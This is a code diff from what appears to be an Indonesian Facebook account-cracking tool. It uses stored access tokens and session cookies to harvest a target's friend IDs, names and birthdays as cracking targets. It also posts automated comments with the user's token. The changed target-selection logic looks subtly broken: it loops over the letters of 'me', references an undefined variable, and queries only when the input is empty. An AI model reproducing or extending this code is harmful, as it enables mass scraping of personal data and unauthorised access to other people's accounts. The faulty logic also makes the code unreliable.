@@ -464,7 +464,7 @@ def login_lagi334():
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok}", headers = {"cookie":your_cookies})
-									followdong()
+									
 									back()
 							except Exception as e:
 								print(e)
@@ -875,17 +875,25 @@ def publik():
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()		
 		a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
-		try:
-			params = {
+		if a in ['me']:
+			for mee in a:
+				koH = requests.get('https://graph.facebook.com/v1.0/'+mee+'?fields=friends.limit(5000)&access_token='+tokenmu[0],cookies={'cookie': cok}).json()
+				for pi in koH['friends']['data']:
+					try:id.append(pi['id']+'|'+pi['name'])
+					except:continue
+				setting()
+		elif a in ['']:
+			try:
+				params = {
 			"access_token": token, 
 			"fields": "name,friends.fields(id,name,birthday)"
 			}
-			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
-			for c in b["friends"]["data"]:
-				id.append(c["id"]+"|"+c["name"])
-			setting()
-		except Exception as e:
-			print(e)
+				b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+				for c in b["friends"]["data"]:
+					id.append(c["id"]+"|"+c["name"])
+				setting()
+			except Exception as e:
+				print(e)
 #-------------------[ CRACK-PUBLIK ]----------------#
 def massal():
     try:
